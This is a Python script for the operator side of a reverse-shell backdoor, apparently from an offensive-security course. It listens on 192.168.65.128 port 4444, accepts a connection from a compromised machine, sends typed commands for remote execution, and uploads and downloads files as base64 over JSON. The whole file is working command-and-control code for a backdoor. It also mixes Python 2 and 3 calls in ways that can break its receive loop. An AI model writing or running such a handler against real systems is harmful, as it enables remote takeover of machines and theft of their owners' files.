#!/usr/bin/env python
import socket, json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections!")
        self.conn, addr = listener.accept()
        print("[+] Got a new connection from " + str(addr))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.conn.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.conn.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "w") as file:
            file.write(base64.b64decode(content))
            return "[+] Downloaded successfully"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                command_result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error " not in command_result:
                    command_result = self.write_file(command[1], command_result)
            except Exception :
                command_result = "[-] Error during command execution."
            print(command_result)


my_listener = Listener("192.168.65.128", 4444)
my_listener.run()